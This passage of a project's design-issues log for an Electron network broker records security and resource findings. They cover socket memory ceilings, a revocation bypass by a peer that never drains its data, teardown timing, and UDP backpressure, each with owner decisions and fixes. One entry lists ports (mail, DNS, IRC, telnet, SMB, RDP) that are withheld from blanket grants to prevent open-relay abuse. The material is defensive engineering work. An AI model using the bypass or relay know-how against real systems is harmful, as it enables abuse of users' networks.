match `readWindowBytes` "would be an unforced increase to an already-unbounded aggregate
(flagged, not fixed, in `open-questions.md`)" — but no prior entry here actually names this. The
real numbers: `LIMITS.concurrentSockets` (512) times `readWindowBytes` (1 MiB) already commits
512 MiB of worst-case per-origin memory before this PR; `writeWindowBytes` (256 KiB) adds up to
another 128 MiB, for a combined ~640 MiB per-origin ceiling — real, structural, and not
referenced by any A-number an auditor searching for a T11/T11b tracking entry would find.

**Still open, not fixed by this PR or any sibling in this stack:** no single check anywhere
enforces a *combined* cap across concurrently-open sockets for one origin; each socket's window
is bounded individually, but the aggregate is only as bounded as `concurrentSockets` allows.
Whether 640 MiB/origin is an acceptable ceiling for the MVP, or whether a future PR should add
an aggregate per-origin quota (distinct from the per-socket window), is the owner's call —
raised here rather than decided unilaterally, per Rule 1.

**Needed by:** whoever next revisits `LIMITS.concurrentSockets` or adds a third per-socket
window (e.g. if a future capability needs its own credit scheme) should re-derive this number
rather than assume it stayed flagged-but-unfixed by coincidence.


> **Owner decision, 2026-09-06.** Neither of the two options this entry offered (accept 640 MiB,
> or add a second aggregate quota) was taken. The owner's answer was a third one: *the app
> declares the connection count it needs, the user sees that number when granting, and the
> broker enforces what was declared.*
>
> The aggregate is therefore bounded by a DECLARATION rather than by a second runtime cap --
> and, more to the point, by a number a person actually saw. The socket count is the memory
> ceiling (every open socket pins `readWindowBytes + writeWindowBytes`), so bounding one bounds
> the other.
>
> Shipped as `NetCapability.concurrentSockets` (PR #89, contracts) plus
> `GrantLedger.socketAllowance` and its enforcement in `assertCapacity` (PR #92). An app that
> declares nothing gets `LIMITS.defaultConcurrentSockets` (64, ~80 MiB) rather than the 512
> ceiling: modest on purpose, so that anything genuinely needing the ceiling has to ask for it
> in the manifest, where the prompt can show it. A declaration above the ceiling is clamped, not
> rejected -- rejecting would make a future change to `LIMITS.concurrentSockets` a breaking
> change for every already-published manifest. It follows `FsCapability.quotaBytes`, which had
> already solved the identical problem for disk.
>
> **Still not bounded, stated as an omission rather than left to be rediscovered:** the aggregate
> ACROSS origins. Ten apps at 64 sockets each is still 640 sockets. That was never in this
> entry's scope, which is explicitly per-origin, and no part of this work claims otherwise.

### A81 — clean socket teardown depends on an unverified same-tick MessagePortMain delivery guarantee **[STILL OPEN]**

Found 2026-09-06, adversarial-review pass on `stream/broker-23-write-pump` (PR #80).

`src/broker/transport/socket-relay.ts`'s teardown path does `pump.stop()` (which `postMessage`s the
terminal `end` message) immediately followed by `cleanup()` -> `port.close()`, in the same
synchronous tick. Every "clean" socket close in this stack's design depends on
`MessagePortMain` actually delivering a message posted immediately before `close()` is called
on the same port — nobody has verified this against the real Electron implementation; every
existing test uses a fake `PortLike` whose `close()` is a no-op, so the fake cannot fail this
way even if the real one does.

**Still open:** if the real `MessagePortMain` ever drops a same-tick posted-then-closed
message (plausible if delivery is asynchronous/queued rather than synchronous), every "clean"
teardown in this design silently degrades to the renderer's 15-second silence timer reporting
`'timeout'` instead of the real terminal reason — the same wrong-error-code failure mode as
A69, but from the closing side rather than the peer-FIN side.

**Needed by:** whoever next has a real Electron test harness in hand for this subsystem should
add a same-tick post-then-close regression test against a REAL `MessagePortMain` pair (not the
fake), to convert this from an assumption into a verified guarantee one way or the other.

### A82 — the capability model has no destination-port restriction or egress rate limit once `tcp.connect` is granted **[RESOLVED 2026-09-06 — owner decision]**

Found 2026-09-06, adversarial-review pass on `stream/broker-23-write-pump` (PR #80), surfaced
per Rule 3 rather than smoothed over — this is pre-existing design from earlier sessions, not
introduced by this PR, but PR #80 is what "arms" it: the write direction is what turns an
already-accepted READ capability into a genuine outbound-traffic-generation primitive.

`checkConnect`/`policy/address.ts` correctly scope `tcp.connect` to public unicast addresses
only (loopback, private, link-local and metadata addresses are all blocked — no SSRF-to-LAN).
But within that already-correct scope: a grant of `*:*` is possible and the flagship app
declares one; nothing restricts which DESTINATION PORT a granted origin may dial (port 25,
6667, 53 are all reachable identically to 443); and nothing in `LIMITS` bounds egress byte-rate
or connection-churn per origin. Combined with 512 concurrent sockets and now a working write
direction, a single granted origin is a real outbound traffic generator from the user's own IP
address — e.g. usable as an open relay for the specific things port restrictions and rate
limits conventionally exist to prevent.

**Still open, genuinely the owner's call, not decided here:** whether this is an acceptable MVP
risk (the grant is explicit, user-approved, and per-origin — not automatically exploitable
without a user first choosing to grant broad network access to a specific app) or whether it
needs a mitigation before this stack (or a near-term follow-up) ships — e.g. a documented
recommended-grant-scope UI nudge, a default egress rate limit, or a port-range restriction
option surfaced at grant time. Not blocking the current merge (this is pre-existing scope,
already implicitly accepted when `tcp.connect` was designed), but flagged explicitly rather
than left to be rediscovered later.

**Needed by:** the owner, before any product surface (a permission-prompt UI, a marketing
description of the capability model) makes a claim about what a network grant does and does not
allow.


> **Owner decision, 2026-09-06: mitigate the port half, accept the rate half.** Of the three
> mitigations this entry offered, the owner chose the port restriction, in its wider form.
>
> **Done (PR #91).** Ten ports are excluded from any BLANKET grant and reachable only when a
> pattern names the exact port: 25/465/587 (mail), 53 (DNS), 6667/6697 (IRC), and 23/139/445/3389
> (telnet, SMB, RDP). A range is treated as a blanket, not a naming -- `20-30` covers 25 without
> anyone having read the number -- so the escape hatch is a literal `:25` an app author typed and
> a person approved. `src/broker/policy/reserved-ports.ts`, enforced in `checkConnect`.
>
> **Deliberately NOT done: the egress rate limit.** It fights the flagship's entire purpose --
> a torrent client exists to move bytes as fast as the swarm allows -- and no defensible number
> exists to pick today. Recorded here as an accepted tradeoff, not an oversight.
>
> **What the prompt must still say, and this is the part that is not code.** The remaining
> exposure is real: a granted `*:*` origin can still open many connections to many public hosts
> and push data at line rate. This entry's own "Needed by" was the owner, before any product
> surface makes a claim about what a network grant allows -- that obligation is unchanged and
> now belongs to build step 4's prompt. `contracts/manifest.ts` already requires the plain-words
> version ("connect to any computer on the internet"); the honest sentence has to survive into
> the UI.
>
> **Scope: `tcp.connect` only.** `udp.send` shares the pattern grammar and wants the same rule,
> but has no implementation to wire it into. Named in the module header and `src/broker/README.md`
> so whoever builds `udp.send` inherits it.

### A84 — a non-draining peer can defeat `net.close()`/revocation, permanently orphaning a live socket **[RESOLVED 2026-09-06 — owner decision]**

Found 2026-09-06, an independent vulnerability-hunt pass on `stream/broker-23-write-pump`
(PR #80). **Empirically confirmed against Node v24.11.1** (the pinned version), not just read
out of the source. Pre-existing on `main` — not introduced by this PR stack, but see the scoping
note below for why it is raised now rather than left for whenever it happened to be noticed.

**The mechanism.** `src/broker/handles/handle-store.ts`'s `closeTree()` deletes a handle's record from
`this.handles` and from `byGrant` **synchronously**, before it awaits `record.destroy(reason)`.
For `reason === 'closed'`, `destroy` calls `destroySocket(socket, 'closed')`
(`src/broker/adapters/node-adapters.ts`), which is `new Promise(resolve => socket.end(() => resolve()))`.
`socket.end()`'s callback only fires once Node's `'finish'` event fires, which requires every
queued outbound byte to actually drain into the peer's TCP receive window. **A peer that simply
stops reading never lets that happen** — the callback never fires, `destroy()` never resolves,
and the handle's own `closed` promise never settles.

Everything that actually tears the socket down in `src/broker/transport/socket-relay.ts` (`pump.stop()`,
`sink.stop()`, `cleanup()` -- which frees the registry slot and closes the port) is gated on that
same `closed` promise settling. So: the record is already gone from `handles`/`byGrant` (step 1,
synchronous), but the underlying OS socket, the port, and the registry slot are all still fully
live (step 2, never happens). `revoke()` (`handles.ts`) walks `byGrant` to find what to kill --
finds nothing. `dropOrigin()` walks `handles` -- finds nothing. **There is no remaining code
path that can close this socket once this window opens.** It also silently stops counting
against `LIMITS.concurrentSockets`.

`socket.end()` is a half-close: the read direction is untouched throughout, so peer data keeps
flowing into the renderer the whole time this window is open, and (new since this PR arms the
write direction) the write side -- the sink's writer and its acceptance of further `write`
messages -- also stays live, which the old inline `main` implementation did not have to account
for since there was no write pump.

**Empirical reproduction** (peer = `net.createServer(s => s.pause())`, i.e. a peer that accepts
the connection and then never reads): queued ~3 MB with `writableLength` still over 1 MB three
seconds later; `end()`'s callback never fired; the socket was not destroyed; the client still
received bytes the peer had queued, after the app had already called `close()`.

**Scoping, honestly stated:** the underlying gating bug is pre-existing on `main`, in code this
PR stack did not write. It is raised here, now, for two reasons specific to this stack rather
than left as a someday-finding: (1) this is the first PR to expose `net.connect`/`close()` to
page script at all -- before it, nothing reachable from a real page could trigger this path, so
the bug was real but unreachable; (2) `socket-relay.ts` (new in this PR) is what makes the WRITE
direction also stay live inside the window, which is new exposure the pre-existing bug did not
previously have to be evaluated against.

**Why this does not block the current merge:** per PR #81's own body, no production code path
calls `broker.registerApp()`/`broker.grant()` for any real origin yet -- that is build step 4's
job. So even after this whole stack merges, nobody can actually reach this bug in production,
identically to why the rest of this stack's `net.connect` surface is safe to ship
always-`denied`. The moment build step 4 ships real grants, this stops being latent.

**Two fix shapes, both named by the finding, neither applied here -- owner's call which:**
(a) the smaller change: race `socket.end(cb)` against a timeout in `destroySocket`, falling
through to `socket.destroy()` if the peer never drains, so `closed` always eventually settles;
(b) the more thorough change: stop making relay teardown depend on `closed` settling at all --
have `closeTree` fire a synchronous "unlinked" hook at the same point it removes the record,
which `socket-relay.ts` uses to run its teardown immediately, leaving `closed` to report only
the wire outcome afterward. (b) also closes the window that makes the already-known
`socket.fail()`-throws-after-reap crash (assigned to `fix-80` as B-F9/NEW from `review-security`)
reachable ON DEMAND rather than by race, since the record-already-gone state is exactly what
that crash depends on -- whoever picks (b) should coordinate with that fix.

**A closely related MEDIUM, independently confirmed by the same pass, already covered:** when a
grant is revoked while a write is outstanding, the app currently only ever finds out via the
15-second silence timeout (reporting `'timeout'`, not `'revoked'`) rather than an immediate
`write-failed` carrying the real reason -- this is the exact fix already requested of `fix-80` as
NEW-F4 in this run (make `PortSink.stop(code)` emit a real `write-failed` before going silent,
mirroring `PortPump.stop(code)`'s existing shape). No separate action needed; noted here only to
record that two independent review passes converged on the same root cause from different
trigger scenarios (broker-initiated revoke here, vs. abrupt read-end/peer-reset in NEW-F4).

**Needed by:** before build step 4 (the app loader, real grants) ships -- this is the point at
which "the owner revokes an app's network access and it actually stops" becomes a real,
user-facing promise rather than an unreachable one, and this bug means that promise does not
currently hold against an uncooperative remote peer.

---


> **Owner decision, 2026-09-06: BOTH fix shapes, not one (PR #90).** The reasoning for taking
> both is that either alone leaves a real gap -- without (a) the handle's `closed` still never
> settles for a stalled peer, and without (b) the registry slot and the relay still wait on it.
>
> **(b), the thorough one.** `HandleRecord` gained an `unlink` hook that `closeTree()` fires
> synchronously, in the same pass that removes the record from `handles`/`byGrant`, before any
> destroy is awaited. `socket-relay.ts` subscribes to it via `FailableTcpSocket.onUnlink`. This
> finishes a design that was already stated rather than adding a new one -- `closeTree`'s own doc
> already promised "the unlink pass and the promise rejections are SYNCHRONOUS, before any
> destroy callback runs. That ordering is what makes revocation immediate"; the relay simply was
> not subscribed to it.
>
> **The hook fires for every reason; the relay acts on only some. This distinction was NOT in
> the first implementation, and review caught it losing data.** `stop()` cancels the read
> stream, and cancelling the readable half of a `Duplex.toWeb` destroys the whole socket,
> discarding its write queue. So tearing down at unlink on a reason that FLUSHES
> (`'closed'`/`'sessionEnded'`, where `destroySocket` calls `socket.end()`) truncates the app's
> own final bytes. Measured against a real paused peer: 8 MiB queued, 8 MiB lost, where the
> unmodified path delivered all 11 MiB. Those reasons now settle through `closed` instead --
> later than unlink, but complete, and fix (a) is what guarantees they settle at all.
> `'revoked'`/`'aborted'`/`'failed'` destroy the socket regardless, so they still tear down
> immediately, which is what this entry and A70 actually needed.
>
> The listener therefore receives the `CloseReason`, not only the error code: `'sessionEnded'`
> and `'revoked'` both carry code `'revoked'` and fall on opposite sides of that branch, so the
> code alone cannot decide it.
>
> **(a), the smaller one.** `destroySocket` now races `socket.end(cb)` against
> `CLOSE_DRAIN_TIMEOUT_MS` (30s, an AI-chosen value matched to `DIAL_TIMEOUT_MS`; nothing in the
> corpus specifies one) and calls `socket.destroy()` if the deadline wins.
>
> **The wire did not change, only the timing.** The hook passes `undefined` for an app-initiated
> close and the real code otherwise, which is exactly what `socket.closed` already distinguished
> by resolving vs. rejecting.
>
> **Verified as the finding asked, not by reading.** The reproduction is now a test:
> `src/broker/adapters/tests/socket-drain.test.ts` dials a real local server that accepts and then `pause()`s,
> queues past 1 MiB of `writableLength`, and asserts `destroySocket` settles and the socket is
> destroyed. The same file also pins the truncation hazard above as a matched pair
> (cancel-then-close loses bytes, close-alone does not), so the branch that avoids it cannot be
> simplified away without a test going red.
>
> **This closes A70 as a side effect** -- see that entry, including what it does *not* claim.
>
> **This increases exposure to A81**, and that is worth stating rather than leaving to be found:
> `stop()` posts a terminal message and then closes the port in the same tick, and it now runs on
> a new and more common path. If `MessagePortMain` does not deliver a same-tick posted-then-closed
> message, more closes than before degrade to the renderer's silence timer. A81 is unchanged and
> still wants a real `MessagePortMain` pair to test against.
>
> **The coordination note in this entry still stands.** Fix (b) makes the record-already-gone
> state reachable on demand rather than by race, which is what the `socket.fail()`-throws-after-
> reap crash depended on -- that crash was already fixed on `main` (`socket-relay.ts`'s
> `failSocket`/`abortSocket` guards), and those guards are what keep it closed under the new
> path. Confirmed present, not assumed.

### A69 — `netConnect`'s missing `allowHalfOpen` is real, but its "one-line fix" breaks `Duplex.toWeb`'s EOF detection entirely **[RESEARCH — investigated, no safe fix found yet]**

Found 2026-09-05, `stream/broker-23-write-pump`, while building the write-side byte pump (A37)
and checking `handle-contracts.md`'s close table against the real dial path.

`src/broker/adapters/node-adapters.ts`'s `dialOne` calls `netConnect({ host: address, port })` with no
`allowHalfOpen`, so Node's default (`false`) applies: when the **peer** sends FIN, Node
auto-ends our writable too. This genuinely contradicts close-table row 2
(`handle-contracts.md` §TcpSocket: peer sends FIN → readable ends, **writable stays open**,
`closed` pending) — half-close is called load-bearing there for exactly this reason (a
BitTorrent peer keeps reading a choke/interested handshake long after it stops writing new
requests). The natural-looking fix is one line: add `allowHalfOpen: true` to the `netConnect`
call.

**That fix was written, then reverted before merging, because live testing found it trades this
bug for a worse one.** Checked empirically (Node 24.11.1), not assumed:

- With `allowHalfOpen: true`, once the peer sends FIN, the raw socket's own `readableEnded`
  becomes `true` and its `'end'` event fires correctly and promptly — Node's own classic-streams
  behaviour is exactly right.
- But `Duplex.toWeb(socket).readable`'s `reader.read()` **never resolves with `done: true`** —
  it hangs forever, even though the peer will never send another byte. Confirmed by ruling out
  timing: waiting 500ms after the raw `'end'` event, then calling `reader.read()`, still hangs.
- Confirmed the cause precisely: `reader.read()` only resolves once **our own side ALSO ends**
  (calling `socket.end()` ourselves, in addition to the peer's FIN, immediately unblocks it).
  With `allowHalfOpen: false` (today's default), the same scenario resolves `reader.read()`
  correctly and immediately — the EOF-detection regression appears **only** in combination with
  `allowHalfOpen: true`.
- The write itself succeeds fine after the peer's FIN either way (`allowHalfOpen: true` does fix
  the writable-closes-too-early half of the bug) — the newly-discovered problem is specifically
  that `Duplex.toWeb`'s readable side stops reporting completion at all once the socket can be
  half-open, seemingly gating its "done" signal on the underlying duplex's fully-closed state
  rather than the readable half's own `'end'`.

**Why this is worse than the bug it would have fixed.** The read side (`port-pump.ts`,
merged and tested) depends entirely on `Duplex.toWeb(socket).readable` reporting EOF promptly.
A peer that finishes sending and simply waits (an ordinary, common half-close pattern, not an
edge case) would leave `port-pump.ts` waiting for bytes that will never arrive — the pump never
sends `StreamEndMessage`, and the app-facing `readable` never closes — for the lifetime of the
connection. Shipping `allowHalfOpen: true` as a drive-by fix inside the write-pump PR would have
silently regressed already-correct, already-tested read-side behaviour, for a class of peer
behaviour common enough that it would likely surface in the flagship's own BitTorrent traffic.

**Not fixed here.** `dialOne` still omits `allowHalfOpen`, unchanged — the pre-existing gap
(writable closes too early on a peer FIN) stands exactly as before this was investigated.
Fixing it correctly needs one of: (a) a custom `ReadableStream` wrapper around the socket that
derives its own completion signal from the raw socket's `'end'` event rather than trusting
`Duplex.toWeb`'s, independent of `allowHalfOpen`; (b) confirming whether a newer or older Node
release behaves differently (not checked — this repo pins Node 24); or (c) filing this upstream
against Node's `Duplex.toWeb` if no released version resolves it. None of these is a one-line
change, and (a) in particular changes `dialOne`'s readable-stream construction for every socket,
not just half-open ones, so it deserves its own reviewed PR and its own test suite rather than
riding in on the write-pump work that happened to surface it.

**Needed by:** before any fix to this ships. Not blocking build step 2's write-pump work, whose
own half-close support (the app's own `writable.close()`/`.abort()`, handled in
`port-sink.ts`) is unaffected — Node's half-close behaviour when **we** close first is not
gated by `allowHalfOpen` the way the peer-closes-first direction is.

**Correction, 2026-09-06 (AI-REC, `stream/broker-23-write-pump`, B-F1).** The paragraph above
understates one consequence: the write pump is not "unaffected" once it can be called after a
peer FIN. Before the write-side pump existed, nothing ever wrote after a peer FIN, so the gap
was latent. With the pump wired (this same branch), a write issued after a peer FIN rejects
with an AbortError (`name: 'AbortError'`, `code: 'ABORT_ERR'`, confirmed empirically against a
real socket, not assumed) because Node auto-ended our writable when the FIN arrived.
`mapSocketError` had no sharper mapping for that shape than `'internal'`, and treating any
mapped code as a whole-handle failure meant this specific write rejection killed the read side
and rejected `closed` too — directly the close-table row this entry already names (peer FIN:
readable ends, writable stays open, `closed` pending).

**A narrower fix shipped in this same branch, not touching `allowHalfOpen`.**
`port-sink.ts`'s write-rejection handler now recognises this exact AbortError shape and fails
only the write direction, with code `'closed'`, leaving the read side and `closed` alone. The
writable still ends too early on a peer FIN, exactly as the rest of this entry describes — this
only stops that pre-existing gap from cascading into a second, worse failure (the whole handle
dying) once something writes after it. The deeper fix this entry describes (a custom
`ReadableStream` wrapper, or a Node-version/upstream fix) remains open and unattempted.

---

### A70 — `net.setNoDelay`/`net.setKeepAlive`/`net.close` consult only the connect-time registry, never a live re-check against the grant ledger **[RESOLVED 2026-09-06]**

Found 2026-09-06, `stream/broker-23-write-pump`, during an adversarial pass over this same
branch's diff.

`ipc.ts`'s dispatch for these three control methods looks the handle id up in
`transport.registry` -- populated once, at `net.connect` time -- and, if present, calls straight
through to the registered `close`/`setNoDelay`/`setKeepAlive`. None of the three re-derives or
re-checks the grant that authorised the underlying socket. `handles.ts`'s own header states the
invariant this is measured against: "every operation on a handle goes through `lookup` or
`run`" (T11c's ownership re-check, generalised) -- but these three control methods bypass
`HandleTable` entirely, going through `PortRegistry` instead, which has no concept of a grant at
all.

**Practical window.** Between a grant being revoked and the socket's `closed` promise actually
settling (revocation is documented as NOT waiting for teardown -- see `HandleTable.revoke`'s own
doc, "does not wait for teardown"), these three calls can still succeed against a socket that is,
from the app's declared authority, already gone. `net.close` succeeding here is arguably benign
(the app is asking to close something already being closed); `net.setNoDelay`/`net.setKeepAlive`
succeeding is a narrower concern -- calling a native binding against a socket mid-revocation,
for a capability the ledger no longer grants.

**Not fixed here.** This pattern predates this PR (the registry-lookup shape for `net.close` was
already there); this PR only added two more control methods following the same shape. Whether
the fix is "re-check `HandleTable.lookup` before dispatching these three" or "accept that the
window is bounded by how fast `closed` settles and is not worth the extra check" is a design
call, not a mechanical one -- flagged rather than decided here.

**Needed by:** whoever next touches `ipc.ts`'s net.* dispatch, or before this window is treated
as closed by any future security review.

> **Correction, 2026-09-06 (`stream/backlog-12-comment-budget-gap`).** Resolved in the direction
> A64 left open: `measurePreamble` (now `findPreambleBlock`) treats an import line as neither a
> comment nor the end of the opening region, so a header essay after the imports measures the
> same as one at line one. Two real in-review PRs (`src/broker/transport/port-sink.ts`,
> `src/preload/orivon-surface.ts`) exposed the gap by placing a 40+/46-line rationale block after
> their imports; both are now correctly flagged. Restores the pre-PR#68 46-line reading for A64's
> own file, `src/broker/policy/origin.ts`, rather than the 16-line one the bug produced. See A79
> for what re-measuring correctly also surfaced.

---


> **Resolved 2026-09-06 (PR #90), and NOT by the fix this entry proposed.** Neither named option
> was taken: no re-check was added to `ipc.ts`, and the window was not accepted either. Fixing
> A84 closed it structurally instead.
>
> The window this entry describes is bounded by "how fast `closed` settles", and A84's fix stops
> teardown depending on `closed` at all: `socket-relay.ts` now runs `cleanup()` -- which calls
> `registry.remove(origin, socket.id)` -- from the unlink hook, in the same synchronous pass that
> removes the handle from `handles`/`byGrant`. So by the time revocation has returned, the
> `PortRegistry` entry all three control methods look up is already gone, and all three degrade
> to their existing silent no-op for an unknown id.
>
> **What this does NOT claim.** `PortRegistry` still has no concept of a grant, and these three
> methods still do not consult `HandleTable`. The invariant in `handles.ts`'s header ("every
> operation on a handle goes through `lookup` or `run`") is still literally untrue of them. What
> changed is that the registry can no longer answer for a handle the tables have released, which
> is what made the gap reachable. If a future change reintroduces a path that registers a socket
> without unlinking it, this reopens -- so the assertion lives in a test
> (`socket-relay.test.ts`, "releases the registry slot the moment the handle is unlinked"),
> not only in this paragraph.

### A79 — fixing A64 correctly reveals FIVE more files already over the Rule 1 budget on `main`, not just the two known ones **[RESOLVED 2026-09-06]**

Found 2026-09-06, `stream/backlog-12-comment-budget-gap`, verifying the A64 fix against `main`'s
current tree per that lane's own gate instructions ("run `check:comments` against `main`
unchanged, to catch a false positive in the new logic").

It is not a false positive. A64's bug -- `measurePreamble` stopping at the first line that is
neither comment nor blank, which an import always is -- silently hid every file shaped
[imports][rationale essay][first declaration], not just the two sibling PRs
(`stream/broker-23-write-pump`, `stream/broker-24-preload-net-surface`) were reviewed under.
Running the fixed checker against `main` as it stands today (no source file changed) finds five
more in that same shape, none previously flagged, none in `scripts/comment-budget-baseline.txt`:

- `src/broker/policy/derive-p256.ts` -- 26 lines (limit 25)
- `src/broker/policy/origin.ts` -- 30 lines (the exact file A64 was filed on; see the correction
  there -- this is its restored, accurate measurement)
- `src/broker/policy/update.ts` -- 52 lines
- `src/broker/transport/port-pump.ts` -- 45 lines
- `src/main/index.ts` -- 40 lines

Each was read in full (not just measured) to rule out a detection bug rather than a real
violation: all five are genuine ALL-CAPS-section rationale blocks sitting between the last import
and the first substantive declaration -- structurally identical to `port-sink.ts` and
`orivon-surface.ts`'s own headers, right down to the "argues against a design not chosen" shape
Rule 1's guard exists to catch. `src/preload/orivon-surface.ts` itself is also on this list in its
CURRENT `main` form (44 lines), independent of `broker-24`'s own larger version (47) -- that
sibling PR grows an already-hidden violation rather than introducing a new one.

**Why not fixed or baselined here.** Every one of these six files (five above plus
`orivon-surface.ts`) is owned by a stream other than this one (`comment-budget-gap` owns
`scripts/check-comments.mjs` and its test only), so rewriting any of them is the cross-stream edit
`parallel-work.md` says to raise, not make. Baselining them is equally not this lane's call:
`scripts/comment-budget-baseline.txt`'s own header says, in as many words, "Nothing may be ADDED
here. New code meets the budget" -- reopening that file to add six entries reverses a written
convention, which is exactly the kind of promotion-by-side-effect Rule 1 (`CLAUDE.md`) warns
against.

**The practical consequence:** once this branch's checker fix reaches `main`, `check:comments`
goes red on `main`'s own HEAD for these six files, independent of which PR happens to carry the
fix -- fixing the bug and having `main` stay green are not both possible without one of the three
remedies below landing first, or in the same merge.

**AI recommendation, matching A54 SS1's precedent for the original 16-file baseline:** each owning
stream fixes its own file's header (move the rationale to that directory's `README.md` under
`## Design notes`; `src/trust/README.md` is the worked example) the next time it touches that
file, rather than one coordinated branch reaching into five unrelated streams' paths. For
whichever files cannot land a fix before this checker merges, either a per-file
`// orivon:comment-budget -- <reason>` pragma (written by that file's owning stream, since the
reason has to be real) or a one-time, owner-approved reopening of the baseline for exactly these
six entries. **Owner's call** which remedy, and in particular whether the baseline's "closed" rule
gets a one-time exception or stays closed while every file gets fixed or pragma'd first.

**Needed by:** before `stream/backlog-12-comment-budget-gap` merges to `main` -- this is the
sequencing note the conductor asked this lane to surface rather than resolve unilaterally.

**Resolution, 2026-09-06 (conductor).** Took the AI recommendation's first remedy: dispatched a
dedicated branch (`stream/backlog-13-comment-budget-cleanup`, PR #85) to fix the five files this
lane does not own -- the sixth, `orivon-surface.ts`, was already being fixed on
`stream/broker-24-preload-net-surface` (PR #81) for the same reason. All six now pass the
corrected checker and merged to `main` before this branch (comment-gate itself), so `main`'s
`check:comments` never actually goes red -- the sequencing problem this entry raised was avoided,
not merely tracked. The baseline file's "closed" rule was correctly left untouched.

---

### A85 — the broker's directory boundaries are declared in five READMEs and enforced by nothing **[STILL OPEN — AI recommendation]**

**Raised 2026-09-06**, by the restructure that created them (`ADR-0015`, `stream/broker-29-file-layout`).

`src/broker/` is now five directories, each carrying a `README.md` with a **what it must never
import** section. Those declarations were read off the real import graph rather than asserted,
so they are true today. Nothing keeps them true tomorrow.

**The four rules currently stated in prose only:**

- `policy/` must import nothing that performs I/O — no `electron`, `node:fs`, `node:net`,
  `node:dns`. This one is the oldest and the most load-bearing: it is what makes the
  security-critical decision functions testable with no network, which is the entire argument
  of `policy/README.md` and of `build-plan.md`'s Week 0 structural decision.
- `handles/` must import no `node:*` builtin at all. Every real resource arrives as an injected
  `destroy` callback; an import here would mean the handle table had started owning a resource
  directly, which is exactly the coupling the injection exists to prevent.
- `adapters/` must not import `electron`. It is the Node seam, not the Electron one.
- `src/broker/` as a whole must not import `src/shim/`, `src/loader/`, `src/preload/` or any
  renderer code — the pre-existing rule from `src/broker/README.md`, which also has no guard.

**Why this was not built in the same change.** A guard written the same hour as the layout tests
the author's assumptions, not the layout's staying power. A few weeks of real edits will show
which rule actually drifts, and a guard aimed at that is worth more than four written blind.
Deliberately deferred, not overlooked — owner's call, 2026-09-06.

**Shape it would take if built.** `scripts/check-layers.mjs` plus an `npm run check:layers`,
alongside `check:contracts` in CI. `check-contracts-pure.mjs` is the working model: it already
walks a directory's imports and fails on anything outside an allowed set, so this is a
generalisation of an existing guard rather than a new mechanism (Rule 6).

**One wrinkle it has to handle.** `grants/node-ledger-storage.ts` writes to disk while living
outside `adapters/` (see `ADR-0015` §Consequences), so a rule of the form "only `adapters/` may
import `node:fs`" needs a named allowlist entry rather than being absolute. That is not a reason
to skip the guard — `check:comments` already carries an exemption mechanism with a required
reason, and `enforcement-keeps-a-justified-escape-hatch` is the established owner preference:
exceptions possible, never silent.

**Counter-argument worth recording.** `CLAUDE.md` states that Rules 2 and 3 of the code
guidelines are unenforced by owner's decision — "rules first, enforcement later" — and this
would be a third guard on a solo project. The case for building it anyway is the one that closed
that deferral for Rule 1: the rule was being followed and the codebase drifted regardless,
because a human cannot see an import boundary by reading one file at a time. If `A85` is ever
resolved by *not* building it, that reasoning is what has to be answered.

**Widened 2026-09-07** (`stream/backlog-14-test-layout`). The test-placement rule now applies to
the whole repository, not only the broker — every test lives in a `tests/` folder inside the
directory it covers ([`code-guidelines.md`](development/code-guidelines.md) §Where a test file
lives). It is unenforced for the same reason and in the same way as the import boundaries above:
`check-size.mjs` and `check-comments.mjs` both classify by filename suffix (`*.test.ts`), never
by directory, so a test file left beside its source still receives the 800-line budget and still
passes CI. Whatever eventually closes this entry should cover both rules; they are one gap with
two faces, not two entries.

---

### A86 — the specified UDP inbound window is a count, and a count alone cannot bound the memory **[AI-REC]**

**Raised 2026-09-07**, writing the datagram wire (`stream/contracts-14-datagram-wire`), build
step 2's UDP work.

`handle-contracts.md` §UdpSocket specifies inbound backpressure as *"the `readable` internal
queue is full"* — a WHATWG queue under a `CountQueuingStrategy`, so a **count**. Two things are
wrong with implementing exactly that sentence, and they pull in opposite directions.

**A count alone does not bound memory.** The worst case is
`inboundDatagramWindow` x `maxDatagramBytes`. Any count large enough for real DHT traffic — a
node receives many small packets in a burst — puts that product far above what a TCP socket may
pin (`readWindowBytes`, 1 MiB). At 256 datagrams it is ~16 MiB per socket, and at the modest
default of 64 sockets, ~1 GiB for one origin. `LIMITS.defaultConcurrentSockets`' own reasoning
("the socket count IS the memory ceiling", owner decision 2026-09-06) is computed against the
TCP windows and would be wrong for any app that opens a UDP socket.

**A byte bound alone does not bound message count.** One megabyte of one-byte datagrams is a
million messages across the port. Bounding the bytes says nothing about the per-message cost,
which is the cost the byte windows were introduced to control in the first place.

**What was built:** both, released together — `LIMITS.inboundDatagramWindow` (256) and
`LIMITS.inboundDatagramWindowBytes` (1 MiB, deliberately the same number as `readWindowBytes` so
the per-origin arithmetic holds whichever kind of socket an app opens). Whichever is exhausted
first starts the drop. Same shape as A84's resolution: two mechanisms where either alone leaves
a real gap.

**Also decided here, and smaller:** the drop happens **in the broker**, not in the renderer's
readable. The specification's wording implies the renderer, but `MessagePortMain` has no flow
control (A37's finding), so a renderer-side drop still has the broker posting every datagram to
a port nobody is draining. The observable behaviour the contract promises — loss, a
`droppedInbound` count, no error — is identical either way.

**Needed by:** nothing blocks on it; this is a recommendation the owner may overrule cheaply
while `orivonApiVersion` is 0 and no third-party app exists. If overruled, the count-only
reading needs an answer to the 1 GiB figure above.

---

### A87 — an outbound datagram that is denied cannot be reported without killing the socket **[RESOLVED 2026-09-07, owner]**

**Raised 2026-09-07**, same branch as A86.

`orivon.net.udpBind` gives an app a `WritableStream<Datagram>`, and unlike `net.connect` there is
no single acquisition-time destination to authorise: a UDP socket has no fixed peer, so the
`udp.send` grant has to be checked **per datagram**. That creates a failure this specification had
no case for — a send the grant does not authorise.

**Why rejecting the write is wrong.** A `WritableStream` reports one failed write by rejecting the
sink's promise, and doing so errors the stream **permanently**. A DHT peer list routinely names
addresses outside what the user granted — private ranges, reserved ports (A82) — so the first
excluded peer would tear down a working swarm. Denying correctly by that route would break the
flagship.

**What was first built, and why it did not stand.** The write was accepted, the datagram
discarded, and `UdpSocket.droppedOutbound` incremented silently — the wire already carried the
reason (`SendFailedMessage.code`), but nothing surfaced it to the app. **Owner's decision,
2026-09-07: a blocked send must tell the app.** Every other denial path in this codebase does;
a bare counter a developer has to think to check is not that, and the owner was explicit that
if this permission boundary does not visibly exist to an app, the enforcement model built around
it does not hold together.

**What was built instead — a second, non-terminal stream.**

```ts
// src/contracts/handles.ts, on UdpSocket
readonly refusals: ReadableStream<SendRefusal>   // { address, port, code }
```

